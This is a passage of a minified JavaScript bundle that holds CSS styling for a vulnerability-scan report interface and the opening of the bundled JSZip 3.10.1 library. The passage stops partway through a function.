    .src-report-header { display:flex; gap:20px; align-items:center; background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:20px; margin-bottom:16px; }
    .src-score-wrap { flex:0 0 auto; }
    .src-score-ring { width:110px; height:110px; border-radius:50%; display:flex; flex-direction:column; align-items:center; justify-content:center; border:3px solid rgba(255,255,255,0.1); }
    .src-score-value { font-size:34px; font-weight:800; line-height:1; }
    .src-score-label { font-size:11px; opacity:0.85; margin-top:4px; }
    .src-report-meta { flex:1; min-width:0; }
    .src-report-title-row { display:flex; align-items:center; gap:12px; flex-wrap:wrap; margin-bottom:10px; }
    .src-report-url { font-family:var(--font); font-size:13px; color:var(--text-secondary); word-break:break-all; }
    .src-report-stats { display:flex; gap:10px; flex-wrap:wrap; margin-bottom:12px; }
    .src-stat { min-width:64px; text-align:center; padding:8px 10px; border-radius:var(--radius-sm); background:var(--bg-secondary); border:1px solid var(--border-light); }
    .src-stat .num { font-size:18px; font-weight:700; }
    .src-stat .label { font-size:11px; color:var(--text-secondary); }
    .src-stat.critical .num { color:#c75450; }
    .src-stat.high .num { color:#f0a732; }
    .src-stat.medium .num { color:#f0a732; }
    .src-stat.low .num { color:#73c990; }
    .src-stat.info .num { color:#808080; }
    .src-stat.total .num { color:var(--primary-light); }
    .src-report-submeta { display:flex; gap:12px; flex-wrap:wrap; font-size:12px; color:var(--text-secondary); }
    .meta-item { background:var(--token-bg); padding:3px 8px; border-radius:var(--radius-xs); }
    .src-report-actions { margin-top:12px; }
    .src-export-btn { background:var(--primary); color:#fff; border:none; padding:6px 14px; border-radius:var(--radius-xs); font-size:12px; cursor:pointer; }
    .src-export-btn:hover { background:var(--primary-light); }

    .src-quality-panel { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); margin-bottom:16px; overflow:hidden; }
    .src-quality-header { display:flex; align-items:center; gap:20px; padding:14px 18px; cursor:pointer; }
    .src-quality-score-wrap { display:flex; flex-direction:column; align-items:center; gap:4px; }
    .src-quality-ring { width:48px; height:48px; border-radius:50%; border:3px solid; display:flex; align-items:center; justify-content:center; }
    .src-quality-title { font-size:11px; color:var(--text-secondary); }
    .src-quality-bars { flex:1; display:flex; flex-direction:column; gap:6px; }
    .src-quality-bar-row { display:flex; align-items:center; gap:10px; }
    .src-quality-bar-label { width:50px; font-size:12px; color:var(--text-secondary); text-align:right; }
    .src-quality-bar { flex:1; height:8px; background:var(--bg-secondary); border-radius:4px; overflow:hidden; }
    .src-quality-bar-fill { height:100%; border-radius:4px; transition:width 0.6s ease; }
    .src-quality-bar-val { width:28px; font-size:12px; font-weight:600; text-align:right; }
    .src-quality-expand { background:var(--bg-secondary); border:1px solid var(--border); color:var(--text-secondary); padding:4px 10px; border-radius:var(--radius-xs); font-size:11px; cursor:pointer; white-space:nowrap; }
    .src-quality-expand:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-quality-detail { padding:0 18px 14px; border-top:1px solid var(--border-light); }
    .src-quality-grid { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin-top:12px; }
    @media (max-width:700px) { .src-quality-grid { grid-template-columns:1fr; } }
    .src-quality-section { }
    .src-quality-section-title { font-size:12px; font-weight:700; color:var(--text-secondary); margin-bottom:8px; }
    .src-quality-section-body { display:flex; flex-direction:column; gap:4px; }
    .src-quality-kv { display:flex; justify-content:space-between; align-items:center; font-size:12px; }
    .src-quality-kv span { color:var(--text-secondary); }
    .src-quality-kv code { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); font-size:11px; }
    .src-quality-dedup { display:flex; align-items:center; gap:8px; margin-top:12px; padding:10px; background:var(--bg-secondary); border-radius:var(--radius-sm); flex-wrap:wrap; }
    .src-quality-label { font-size:12px; font-weight:700; color:var(--text-secondary); }
    .src-quality-stat { font-size:13px; font-weight:600; }
    .src-quality-stat.highlight { color:var(--primary-light); }
    .src-quality-arrow { color:var(--text-secondary); }
    .src-quality-tag { background:var(--token-bg); padding:2px 8px; border-radius:10px; font-size:11px; color:var(--text-secondary); }
    .src-quality-recommendations { margin-top:12px; }
    .src-quality-rec-list { margin:0; padding-left:18px; font-size:12px; color:var(--text-secondary); }
    .src-quality-rec-list li { margin-bottom:4px; line-height:1.5; }

    .src-result-layout { display:grid; grid-template-columns:380px 1fr; gap:16px; }
    @media (max-width:900px) { .src-result-layout { grid-template-columns:1fr; } }

    .src-result-sidebar { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; max-height:calc(100vh - 220px); display:flex; flex-direction:column; }
    .src-list-header { padding:12px 14px; border-bottom:1px solid var(--border-light); font-weight:700; font-size:13px; display:flex; align-items:center; justify-content:space-between; }
    .src-list-count { background:var(--primary); color:#fff; font-size:11px; padding:2px 8px; border-radius:10px; }
    .src-list-items { overflow-y:auto; flex:1; padding:6px; }
    .src-list-item { padding:10px 12px; border-radius:var(--radius-sm); cursor:pointer; border-left:3px solid transparent; margin-bottom:4px; transition:background .12s; }
    .src-list-item:hover { background:var(--bg-secondary); }
    .src-list-item.active { background:var(--verify-selected); border-left-color:var(--primary); }
    .src-list-item.critical { border-left-color:#c75450; }
    .src-list-item.high { border-left-color:#c75450; }
    .src-list-item.medium { border-left-color:#f0a732; }
    .src-list-item.low { border-left-color:#73c990; }
    .src-list-item.info { border-left-color:#808080; }
    .src-list-row { display:flex; align-items:center; gap:8px; }
    .src-list-row.top { align-items:flex-start; }
    .src-list-row.meta { margin-top:6px; flex-wrap:wrap; font-size:11px; }
    .src-sev-badge { font-size:10px; font-weight:700; padding:2px 7px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; flex:0 0 auto; }
    .src-sev-badge.critical { background:#c75450; }
    .src-sev-badge.high { background:#c75450; }
    .src-sev-badge.medium { background:#f0a732; color:#000; }
    .src-sev-badge.low { background:#73c990; color:#000; }
    .src-sev-badge.info { background:#808080; }
    .src-list-title { font-size:13px; font-weight:600; color:var(--text-primary); flex:1; word-break:break-word; line-height:1.4; }
    .src-list-type { font-size:10px; background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); color:var(--text-secondary); }
    .src-list-param { font-size:10px; background:rgba(75,110,175,0.15); color:var(--primary-light); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-list-host { color:var(--text-secondary); font-family:var(--font); white-space:nowrap; overflow:hidden; text-overflow:ellipsis; max-width:180px; }
    .src-list-confidence { font-size:11px; color:var(--text-secondary); margin-left:auto; text-transform:uppercase; }
    .src-list-fp-tag { background:#c7545022; color:#c75450; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; }
    .src-list-merged { background:var(--primary); color:#fff; font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .src-list-corr { background:var(--token-bg); color:var(--text-secondary); font-size:10px; padding:1px 5px; border-radius:3px; font-family:var(--font); }
    .src-list-v { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-v.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-v.probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .src-list-v.suspected { background:rgba(199,84,80,0.2); color:#c75450; }
    .src-list-fb { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:700; margin-left:4px; }
    .src-list-fb.confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .src-list-fb.fp { background:rgba(128,128,128,0.2); color:#808080; }
    .src-list-confidence.high { color:#73c990; }
    .src-list-confidence.medium { color:#f0a732; }
    .src-list-confidence.low { color:#c75450; }
    .verification-badge { display:flex; gap:4px; align-items:center; }
    .verification-badge span { font-size:10px; padding:1px 5px; border-radius:3px; font-weight:600; }
    .v-confirmed { background:rgba(115,201,144,0.2); color:#73c990; }
    .v-probable { background:rgba(240,167,50,0.2); color:#f0a732; }
    .v-suspected { background:rgba(199,84,80,0.2); color:#c75450; }

    .src-result-detail { max-height:calc(100vh - 220px); overflow-y:auto; }
    .src-detail-card { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:0; display:flex; flex-direction:column; }
    .src-detail-header { border-bottom:1px solid var(--border-light); padding:16px 18px 14px; }
    .src-detail-title-row { display:flex; align-items:flex-start; gap:10px; margin-bottom:10px; }
    .src-detail-severity { font-size:11px; font-weight:700; padding:3px 10px; border-radius:var(--radius-xs); color:#fff; white-space:nowrap; }
    .src-detail-severity.critical { background:#c75450; }
    .src-detail-severity.high { background:#c75450; }
    .src-detail-severity.medium { background:#f0a732; color:#000; }
    .src-detail-severity.low { background:#73c990; color:#000; }
    .src-detail-severity.info { background:#808080; }
    .src-detail-title { font-size:17px; font-weight:700; margin:0; color:var(--text-primary); flex:1; line-height:1.4; }
    .src-detail-status { font-size:11px; padding:2px 8px; border-radius:var(--radius-xs); margin-left:auto; border:1px solid var(--border-light); }
    .src-detail-status.open { background:rgba(240,167,50,0.12); color:#f0a732; border-color:rgba(240,167,50,0.3); }
    .src-detail-status.confirmed { background:rgba(199,84,80,0.15); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-detail-status.false_positive { background:rgba(128,128,128,0.15); color:#808080; border-color:rgba(128,128,128,0.3); }
    .src-detail-status.fixed { background:rgba(115,201,144,0.15); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-detail-subtitle { display:flex; gap:10px; flex-wrap:wrap; align-items:center; font-size:12px; color:var(--text-secondary); }
    .src-detail-id { background:var(--token-bg); padding:2px 6px; border-radius:var(--radius-xs); }
    .src-detail-type { color:var(--primary-light); font-weight:600; }
    .src-detail-cwe { background:rgba(199,84,80,0.12); color:#e08e8a; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-owasp { background:rgba(75,110,175,0.12); color:var(--primary-light); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-cvss { background:rgba(240,167,50,0.12); color:#f0a732; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-score { background:rgba(115,201,144,0.12); color:#73c990; padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-confidence { background:var(--token-bg); color:var(--text-secondary); padding:2px 8px; border-radius:var(--radius-xs); }
    .src-detail-fp-badge { background:rgba(199,84,80,0.15); color:#c75450; padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge { padding:2px 8px; border-radius:var(--radius-xs); font-weight:600; }
    .src-detail-verify-badge.verified { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.unverified { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.confirmed { background:rgba(115,201,144,0.15); color:#73c990; }
    .src-detail-verify-badge.probable { background:rgba(240,167,50,0.15); color:#f0a732; }
    .src-detail-verify-badge.suspected { background:rgba(199,84,80,0.15); color:#c75450; }
    .src-fp-reasons { margin-top:8px; }
    .src-fp-reasons ul { margin:0; padding-left:18px; }
    .src-fp-reasons li { font-size:12px; color:var(--text-secondary); margin-bottom:3px; }

    .src-detail-tabs { display:flex; border-bottom:1px solid var(--border-light); background:var(--bg-secondary); }
    .src-detail-tab { background:transparent; border:none; border-bottom:2px solid transparent; color:var(--text-secondary); padding:10px 16px; font-size:12px; font-weight:600; cursor:pointer; }
    .src-detail-tab:hover { color:var(--text-primary); }
    .src-detail-tab.active { color:var(--primary-light); border-bottom-color:var(--primary); background:rgba(75,110,175,0.08); }
    .src-detail-panel { display:none; padding:18px; }
    .src-detail-panel.active { display:block; }

    .src-detail-section { margin-bottom:18px; }
    .src-section-title { font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px; display:flex; align-items:center; gap:6px; text-transform:uppercase; letter-spacing:0.3px; }
    .src-section-body { font-size:13px; color:var(--text); line-height:1.7; }
    .src-kv { display:flex; gap:10px; margin-bottom:6px; align-items:flex-start; }
    .src-k { min-width:60px; color:var(--text-secondary); font-size:12px; }
    .src-v { flex:1; word-break:break-all; }
    .src-repro-steps { padding-left:18px; margin:0; }
    .src-repro-steps li { margin-bottom:6px; }

    .src-evidence-row { display:flex; align-items:center; gap:10px; margin-bottom:10px; flex-wrap:wrap; }
    .src-evidence-label { font-size:12px; color:var(--text-secondary); min-width:60px; }
    .src-payload { background:#3b0d0d; color:#fecaca; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid rgba(199,84,80,0.35); font-size:12px; word-break:break-all; flex:1; }
    .src-signature { background:#2b2b2b; color:#bbbbbb; padding:6px 10px; border-radius:var(--radius-xs); border:1px solid var(--border-light); font-size:12px; word-break:break-all; flex:1; font-family:var(--font); }
    .src-traffic-viewer { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
    @media (max-width:1100px) { .src-traffic-viewer { grid-template-columns:1fr; } }
    .src-traffic-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); overflow:hidden; display:flex; flex-direction:column; min-height:180px; }
    .src-traffic-header { display:flex; align-items:center; justify-content:space-between; padding:8px 12px; background:var(--bg-secondary); border-bottom:1px solid var(--border-light); font-size:12px; font-weight:600; color:var(--text-secondary); }
    .src-traffic-header .src-copy-btn { margin:0; }
    .src-traffic-panel pre { margin:0; padding:12px; overflow:auto; max-height:420px; flex:1; }
    .src-traffic-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }
    .src-screenshot-row img { max-width:100%; border:1px solid var(--border-light); border-radius:var(--radius-sm); margin-top:6px; }
    .src-no-evidence { color:var(--text-secondary); font-size:12px; }

    .src-fix-tabs { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px; }
    .src-fix-tab { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:5px 12px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-fix-tab.active { background:var(--primary); color:#fff; border-color:var(--primary); }
    .src-fix-panel { background:var(--code-bg); border:1px solid var(--border-light); border-radius:var(--radius-sm); padding:12px; position:relative; }
    .src-fix-panel.hidden { display:none; }
    .src-fix-panel pre { margin:0; overflow:auto; max-height:360px; }
    .src-fix-panel code { font-family:var(--font); font-size:12px; color:var(--code-color); white-space:pre-wrap; word-break:break-all; }

    .src-copy-btn { background:rgba(75,110,175,0.15); border:1px solid rgba(75,110,175,0.3); color:var(--primary-light); padding:4px 10px; border-radius:var(--radius-xs); cursor:pointer; font-size:11px; }
    .src-copy-btn:hover { background:var(--primary); color:#fff; }
    .src-references { padding-left:18px; margin:0; }
    .src-references li { margin-bottom:6px; word-break:break-all; }
    .src-detail-actions { display:flex; gap:10px; flex-wrap:wrap; padding:0 18px 18px; }
    .src-action-btn { background:var(--bg-secondary); border:1px solid var(--border-light); color:var(--text-secondary); padding:6px 14px; border-radius:var(--radius-xs); cursor:pointer; font-size:12px; }
    .src-action-btn:hover { border-color:var(--primary); color:var(--primary-light); }
    .src-action-btn.verify { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-action-btn.false-positive { background:rgba(115,201,144,0.12); color:#73c990; border-color:rgba(115,201,144,0.3); }
    .src-action-btn.confirm { background:rgba(199,84,80,0.12); color:#c75450; border-color:rgba(199,84,80,0.3); }
    .src-action-btn.ticket { background:rgba(75,110,175,0.12); color:var(--primary-light); border-color:rgba(75,110,175,0.3); }
    .src-detail-footer { font-size:12px; color:var(--text-secondary); border-top:1px solid var(--border-light); padding:12px 18px; }
    .src-empty { padding:30px; text-align:center; color:var(--text-secondary); }
    .src-empty-detail { padding:40px; text-align:center; color:var(--text-secondary); background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); }
  `,document.head.appendChild(e)}function hr(){gr()}var _t=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function vr(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}function St(e){throw new Error('Could not dynamically require "'+e+'". Please configure the dynamicRequireTargets or/and ignoreDynamicRequires option of @rollup/plugin-commonjs appropriately for this require call to work.')}var Xt={exports:{}};/*!

JSZip v3.10.1 - A JavaScript class for generating and reading zip files
<http://stuartk.com/jszip>

(c) 2009-2016 Stuart Knightley <stuart [at] stuartk.com>
Dual licenced under the MIT license or GPLv3. See https://raw.github.com/Stuk/jszip/main/LICENSE.markdown.

JSZip uses the library pako released under the MIT license :
https://github.com/nodeca/pako/blob/main/LICENSE
*/var Ai;function mr(){return Ai||(Ai=1,(function(e,i){(function(t){e.exports=t()})(function(){return(function t(r,s,o){function a(g,v){if(!s[g]){if(!r[g]){var d=typeof St=="function"&&St;if(!v&&d)return d(g,!0);if(n)return n(g,!0);var f=new Error("Cannot find module '"+g+"'");throw f.code="MODULE_NOT_FOUND",f}var h=s[g]={exports:{}};r[g][0].call(h.exports,function(m){var u=r[g][1][m];return a(u||m)},h,h.exports,t,r,s,o)}return s[g].exports}for(var n=typeof St=="function"&&St,c=0;c<o.length;c++)a(o[c]);return a})({1:[function(t,r,s){var o=t("./utils"),a=t("./support"),n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";s.encode=function(c){for(var g,v,d,f,h,m,u,y=[],b=0,k=c.length,x=k,I=o.getTypeOf(c)!=="string";b<c.length;)x=k-b,d=I?(g=c[b++],v=b<k?c[b++]:0,b<k?c[b++]:0):(g=c.charCodeAt(b++),v=b<k?c.charCodeAt(b++):0,b<k?c.charCodeAt(b++):0),f=g>>2,h=(3&g)<<4|v>>4,m=1<x?(15&v)<<2|d>>6:64,u=2<x?63&d:64,y.push(n.charAt(f)+n.charAt(h)+n.charAt(m)+n.charAt(u));return y.join("")},s.decode=function(c){var g,v,d,f,h,m,u=0,y=0,b="data:";if(c.substr(0,b.length)===b)throw new Error("Invalid base64 input, it looks like a data url.");var k,x=3*(c=c.replace(/[^A-Za-z0-9+/=]/g,"")).length/4;if(c.charAt(c.length-1)===n.charAt(64)&&x--,c.charAt(c.length-2)===n.charAt(64)&&x--,x%1!=0)throw new Error("Invalid base64 input, bad content length.");for(k=a.uint8array?new Uint8Array(0|x):new Array(0|x);u<c.length;)g=n.indexOf(c.charAt(u++))<<2|(f=n.indexOf(c.charAt(u++)))>>4,v=(15&f)<<4|(h=n.indexOf(c.charAt(u++)))>>2,d=(3&h)<<6|(m=n.indexOf(c.charAt(u++))),k[y++]=g,h!==64&&(k[y++]=v),m!==64&&(k[y++]=d);return k}},{"./support":30,"./utils":32}],2:[function(t,r,s){var o=t("./external"),a=t("./stream/DataWorker"),n=t("./stream/Crc32Probe"),c=t("./stream/DataLengthProbe");function g(v,d,f,h,m){this.compressedSize=v,this.uncompressedSize=d,this.crc32=f,this.compression=h,this.compressedContent=m}g.prototype={getContentWorker:function(){var v=new a(o.Promise.resolve(this.compressedContent)).pipe(this.compression.uncompressWorker()).pipe(new c("data_length")),d=this;return v.on("end",function(){if(this.streamInfo.data_length!==d.uncompressedSize)throw new Error("Bug : uncompressed data size mismatch")}),v},getCompressedWorker:function(){return new a(o.Promise.resolve(this.compressedContent)).withStreamInfo("compressedSize",this.compressedSize).withStreamInfo("uncompressedSize",this.uncompressedSize).withStreamInfo("crc32",this.crc32).withStreamInfo("compression",this.compression)}},g.createWorkerFrom=function(v,d,f){return v.pipe(new n).pipe(new c("uncompressedSize")).pipe(d.compressWorker(f)).pipe(new c("compressedSize")).withStreamInfo("compression",d)},r.exports=g},{"./external":6,"./stream/Crc32Probe":25,"./stream/DataLengthProbe":26,"./stream/DataWorker":27}],3:[function(t,r,s){var o=t("./stream/GenericWorker");s.STORE={magic:"\0\0",compressWorker:function(){return new o("STORE compression")},uncompressWorker:function(){return new o("STORE decompression")}},s.DEFLATE=t("./flate")},{"./flate":7,"./stream/GenericWorker":28}],4:[function(t,r,s){var o=t("./utils"),a=(function(){for(var n,c=[],g=0;g<256;g++){n=g;for(var v=0;v<8;v++)n=1&n?3988292384^n>>>1:n>>>1;c[g]=n}return c})();r.exports=function(n,c){return n!==void 0&&n.length?o.getTypeOf(n)!=="string"?(function(g,v,d,f){var h=a,m=f+d;g^=-1;for(var u=f;u<m;u++)g=g>>>8^h[255&(g^v[u])];return-1^g})(0|c,n,n.length,0):(function(g,v,d,f){var h=a,m=f+d;g^=-1;for(var u=f;u<m;u++)g=g>>>8^h[255&(g^v.charCodeAt(u))];return-1^g})(0|c,n,n.length,0):0}},{"./utils":32}],5:[function(t,r,s){s.base64=!1,s.binary=!1,s.dir=!1,s.createFolders=!0,s.date=null,s.compression=null,s.compressionOptions=null,s.comment=null,s.unixPermissions=null,s.dosPermissions=null},{}],6:[function(t,r,s){var o=null;o=typeof Promise<"u"?Promise:t("lie"),r.exports={Promise:o}},{lie:37}],7:[function(t,r,s){var o=typeof Uint8Array<"u"&&typeof Uint16Array<"u"&&typeof Uint32Array<"u",a=t("pako"),n=t("./utils"),c=t("./stream/GenericWorker"),g=o?"uint8array":"array";function v(d,f){c.call(this,"FlateWorker/"+d),this._pako=null,this._pakoAction=d,this._pakoOptions=f,this.meta={}}s.magic="\b\0",n.inherits(v,c),v.prototype.processChunk=function(d){this.meta=d.meta,this._pako===null&&this._createPako(),this._pako.push(n.transformTo(g,d.data),!1)},v.prototype.flush=function(){c.prototype.flush.call(this),this._pako===null&&this._createPako(),this._pako.push([],!0)},v.prototype.cleanUp=function(){c.prototype.cleanUp.call(this),this._pako=null},v.prototype._createPako=function(){this._pako=new a[this._pakoAction]({raw:!0,level:this._pakoOptions.level||-1});var d=this;this._pako.onData=function(f){d.push({data:f,meta:d.meta})}},s.compressWorker=function(d){return new v("Deflate",d)},s.uncompressWorker=function(){return new v("Inflate",{})}},{"./stream/GenericWorker":28,"./utils":32,pako:38}],8:[function(t,r,s){function o(h,m){var u,y="";for(u=0;u<m;u++)y+=String.fromCharCode(255&h),h>>>=8;return y}function a(h,m,u,y,b,k){var x,I,z=h.file,M=h.compression,O=k!==g.utf8encode,j=n.transformTo("string",k(z.name)),P=n.transformTo("string",g.utf8encode(z.name)),U=z.comment,Y=n.transformTo("string",k(U)),S=n.transformTo("string",g.utf8encode(U)),H=P.length!==z.name.length,l=S.length!==U.length,A="",J="",N="",$=z.dir,q=z.date,te={crc32:0,compressedSize:0,uncompressedSize:0};m&&!u||(te.crc32=h.crc32,te.compressedSize=h.compressedSize,te.uncompressedSize=h.uncompressedSize);var B=0;m&&(B|=8),O||!H&&!l||(B|=2048);var C=0,ee=0;$&&(C|=16),b==="UNIX"?(ee=798,C|=(function(V,fe){var re=V;return V||(re=fe?16893:33204),(65535&re)<<16})(z.unixPermissions,$)):(ee=20,C|=(function(V){return 63&(V||0)})(z.dosPermissions)),x=q.getUTCHours(),x<<=6,x|=q.getUTCMinutes(),x<<=5,x|=q.getUTCSeconds()/2,I=q.getUTCFullYear()-1980,I<<=4,I|=q.getUTCMonth()+1,I<<=5,I|=q.getUTCDate(),H&&(J=o(1,1)+o(v(j),4)+P,A+="up"+o(J.length,2)+J),l&&(N=o(1,1)+o(v(Y),4)+S,A+="uc"+o(N.length,2)+N);var K="";return K+=`
\0`,K+=o(B,2),K+=M.magic,K+=o(x,2),K+=o(I,2),K+=o(te.crc32,4),K+=o(te.compressedSize,4),K+=o(te.uncompressedSize,4),K+=o(j.length,2),K+=o(A.length,2),{fileRecord:d.LOCAL_FILE_HEADER+K+j+A,dirRecord:d.CENTRAL_FILE_HEADER+o(ee,2)+K+o(Y.length,2)+"\0\0\0\0"+o(C,4)+o(y,4)+j+A+Y}}var n=t("../utils"),c=t("../stream/GenericWorker"),g=t("../utf8"),v=t("../crc32"),d=t("../signature");function f(h,m,u,y){c.call(this,"ZipFileWorker"),this.bytesWritten=0,this.zipComment=m,this.zipPlatform=u,this.encodeFileName=y,this.streamFiles=h,this.accumulate=!1,this.contentBuffer=[],this.dirRecords=[],this.currentSourceOffset=0,this.entriesCount=0,this.currentFile=null,this._sources=[]}n.inherits(f,c),f.prototype.push=function(h){var m=h.meta.percent||0,u=this.entriesCount,y=this._sources.length;this.accumulate?this.contentBuffer.push(h):(this.bytesWritten+=h.data.length,c.prototype.push.call(this,{data:h.data,meta:{currentFile:this.currentFile,percent:u?(m+100*(u-y-1))/u:100}}))},f.prototype.openedSource=function(h){this.currentSourceOffset=this.bytesWritten,this.currentFile=h.file.name;var m=this.streamFiles&&!h.file.dir;if(m){var u=a(h,m,!1,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);this.push({data:u.fileRecord,meta:{percent:0}})}else this.accumulate=!0},f.prototype.closedSource=function(h){this.accumulate=!1;var m=this.streamFiles&&!h.file.dir,u=a(h,m,!0,this.currentSourceOffset,this.zipPlatform,this.encodeFileName);if(this.dirRecords.push(u.dirRecord),m)this.push({data:(function(y){return d.DATA_DESCRIPTOR+o(y.crc32,4)+o(y.compressedSize,4)+o(y.uncompressedSize,4)})(h),meta:{percent:100}});else for(this.push({data:u.fileRecord,meta:{percent:0}});this.contentBuffer.length;)this.push(this.contentBuffer.shift());this.currentFile=null},f.prototype.flush=function(){for(var h=this.bytesWritten,m=0;m<this.dirRecords.length;m++)this.push({data:this.dirRecords[m],meta:{percent:100}});var u=this.bytesWritten-h,y=(function(b,k,x,I,z){var M=n.transformTo("string",z(I));return d.CENTRAL_DIRECTORY_END+"\0\0\0\0"+o(b,2)+o(b,2)+o(k,4)+o(x,4)+o(M.length,2)+M})(this.dirRecords.length,u,h,this.zipComment,this.encodeFileName);this.push({data:y,meta:{percent:100}})},f.prototype.prepareNextSource=function(){this.previous=this._sources.shift(),this.openedSource(this.previous.streamInfo),this.isPaused?this.previous.pause():this.previous.resume()},f.prototype.registerPrevious=function(h){this._sources.push(h);var m=this;return h.on("data",function(u){m.processChunk(u)}),h.on("end",function(){m.closedSource(m.previous.streamInfo),m._sources.length?m.prepareNextSource():m.end()}),h.on("error",function(u){m.error(u)}),this},f.prototype.resume=function(){return!!c.prototype.resume.call(this)&&(!this.previous&&this._sources.length?(this.prepareNextSource(),!0):this.previous||this._sources.length||this.generatedError?void 0:(this.end(),!0))},f.prototype.error=function(h){var m=this._sources;if(!c.prototype.error.call(this,h))return!1;for(var u=0;u<m.length;u++)try{m[u].error(h)}catch{}return!0},f.prototype.lock=function(){c.prototype.lock.call(this);for(var h=this._sources,m=0;m<h.length;m++)h[m].lock()},r.exports=f},{"../crc32":4,"../signature":23,"../stream/GenericWorker":28,"../utf8":31,"../utils":32}],9:[function(t,r,s){var o=t("../compressions"),a=t("./ZipFileWorker");s.generateWorker=function(n,c,g){var v=new a(c.streamFiles,g,c.platform,c.encodeFileName),d=0;try{n.forEach(function(f,h){d++;var m=(function(k,x){var I=k||x,z=o[I];if(!z)throw new Error(I+" is not a valid compression method !");return z})(h.options.compression,c.compression),u=h.options.compressionOptions||c.compressionOptions||{},y=h.dir,b=h.date;h._compressWorker(m,u).withStreamInfo("file",{name:f,dir:y,date:b,comment:h.comment||"",unixPermissions:h.unixPermissions,dosPermissions:h.dosPermissions}).pipe(v)}),v.entriesCount=d}catch(f){v.error(f)}return v}},{"../compressions":3,"./ZipFileWorker":8}],10:[function(t,r,s){function o(){if(!(this instanceof o))return new o;if(arguments.length)throw new Error("The constructor with parameters has been removed in JSZip 3.0, please check the upgrade guide.");this.files=Object.create(null),this.comment=null,this.root="",this.clone=function(){var a=new o;for(var n in this)typeof this[n]!="function"&&(a[n]=this[n]);return a}}(o.prototype=t("./object")).loadAsync=t("./load"),o.support=t("./support"),o.defaults=t("./defaults"),o.version="3.10.1",o.loadAsync=function(a,n){return new o().loadAsync(a,n)},o.external=t("./external"),r.exports=o},{"./defaults":5,"./external":6,"./load":11,"./object":15,"./support":30}],11:[function(t,r,s){var o=t("./utils"),a=t("./external"),n=t("./utf8"),c=t("./zipEntries"),g=t("./stream/Crc32Probe"),v=t("./nodejsUtils");function d(f){return new a.Promise(function(h,m){var u=f.decompressed.getContentWorker().pipe(new g);u.on("error",function(y){m(y)}).on("end",function(){u.streamInfo.crc32!==f.decompressed.crc32?m(new Error("Corrupted zip : CRC32 mismatch")):h()}).resume()})}r.exports=function(f,h){var m=this;return h=o.extend(h||{},{base64:!1,checkCRC32:!1,optimizedBinaryString:!1,createFolders:!1,decodeFileName:n.utf8decode}),v.isNode&&v.isStream(f)?a.Promise.reject(new Error("JSZip can't accept a stream when loading a zip file.")):o.prepareContent("the loaded zip file",f,!0,h.optimizedBinaryString,h.base64).then(function(u){var y=new c(h);return y.load(u),y}).then(function(u){var y=[a.Promise.resolve(u)],b=u.files;if(h.checkCRC32)for(var k=0;k<b.length;k++)y.push(d(b[k]));return a.Promise.all(y)}).then(function(u){for(var y=u.shift(),b=y.files,k=0;k<b.length;k++){var x=b[k],I=x.fileNameStr,z=o.resolve(x.fileNameStr);m.file(z,x.decompressed,{binary:!0,optimizedBinaryString:!0,date:x.date,dir:x.dir,comment:x.fileCommentStr.length?x.fileCommentStr:null,unixPermissions:x.unixPermissions,dosPermissions:x.dosPermissions,createFolders:h.createFolders}),x.dir||(m.file(z).unsafeOriginalName=I)}return y.zipComment.length&&(m.comment=y.zipComment),m})}},{"./external":6,"./nodejsUtils":14,"./stream/Crc32Probe":25,"./utf8":31,"./utils":32,"./zipEntries":33}],12:[function(t,r,s){var o=t("../utils"),a=t("../stream/GenericWorker");function n(c,g){a.call(this,"Nodejs stream input adapter for "+c),this._upstreamEnded=!1,this._bindStream(g)}o.inherits(n,a),n.prototype._bindStream=function(c){var 